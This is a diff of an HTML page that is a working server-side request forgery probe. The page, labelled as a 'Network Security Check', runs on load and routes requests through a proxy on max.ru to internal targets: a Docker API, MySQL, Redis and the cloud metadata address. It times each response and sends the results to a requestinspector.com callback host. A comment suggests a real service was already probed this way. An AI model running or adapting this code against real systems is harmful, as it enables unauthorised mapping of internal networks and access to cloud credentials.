@@ -2,40 +2,44 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Diagnostic Report</title>
-    <meta property="og:title" content="SSRF Test">
-    
-    <meta property="og:image" content="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/SERVER_PROBED_US">
-
+    <title>Network Security Check</title>
+    <link rel="prefetch" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/SERVER_PING">
+</head>
+<body>
+    <h1 id="status">Анализ системы... подождите</h1>
     <script>
         const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
         const proxy = "https://max.ru/proxy?url=";
         
-        // Получаем цель из URL (например, 127.0.0.1:2375)
-        const urlParams = new URLSearchParams(window.location.search);
-        const target = urlParams.get('target') || "127.0.0.1.nip.io:2375";
+        const targets = [
+            {n: "Docker", u: "http://127.0.0.1.nip.io:2375/v1.24/containers/json"},
+            {n: "MySQL", u: "http://127.0.0.1.nip.io:3306"},
+            {n: "Metadata", u: "http://169.254.169.254.nip.io/latest/meta-data/"},
+            {n: "Redis", u: "http://127.0.0.1.nip.io:6379"}
+        ];
 
-        async function start() {
-            const startTime = Date.now();
-            
-            // Отправляем сигнал "Начало теста"
-            fetch(`${inspector}/START_TEST?target=${target}`);
-
-            try {
-                // Пытаемся заставить их прокси обратиться к самому себе
-                await fetch(`${proxy}http://${target}`, { mode: 'no-cors' });
-            } catch (e) {}
-
-            const duration = Date.now() - startTime;
-            
-            // Отправляем результат замера
-            fetch(`${inspector}/RESULT?time=${duration}ms&target=${target}`);
+        async function run() {
+            for (let t of targets) {
+                const start = Date.now();
+                try {
+                    // Самый важный запрос, который дал 6 секунд в прошлый раз
+                    await fetch(`${proxy}${encodeURIComponent(t.u)}`, { 
+                        mode: 'no-cors',
+                        cache: 'no-cache'
+                    });
+                } catch (e) {}
+                
+                const diff = Date.now() - start;
+                
+                // Отправляем результат в инспектор
+                fetch(`${inspector}/REPORT?target=${t.n}&time=${diff}ms`);
+                
+                document.body.innerHTML += `<p>${t.n}: ${diff}ms</p>`;
+            }
+            document.getElementById('status').innerText = "Анализ завершен!";
         }
 
-        start();
+        run();
     </script>
-</head>
-<body>
-    <h1>Testing infrastructure... Check Inspector logs.</h1>
 </body>
 </html>
